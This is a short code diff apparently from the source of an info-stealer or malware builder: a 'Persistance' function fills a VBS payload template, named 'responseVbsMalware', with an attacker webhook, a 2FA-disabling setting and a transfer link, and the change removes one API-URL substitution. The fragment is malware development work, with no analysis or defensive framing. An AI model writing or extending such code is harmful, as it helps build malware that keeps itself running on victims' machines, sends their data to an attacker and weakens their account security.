@@ -2068,7 +2068,6 @@ const Persistance = async () => {
   const responseVbsMalware = scriptVbsContent.toString("utf8") ?? "";
   const vbsContent = responseVbsMalware
     .replace("your_webhook_value", config.webhook)
-    .replace("replace_api_url", config.Placed)
     .replace("your_disablefa_value", config.disable2FA)
     .replace("your_transfer_url_value", config.transfer_link)
     .replace("replace_creator_name", config.creator);
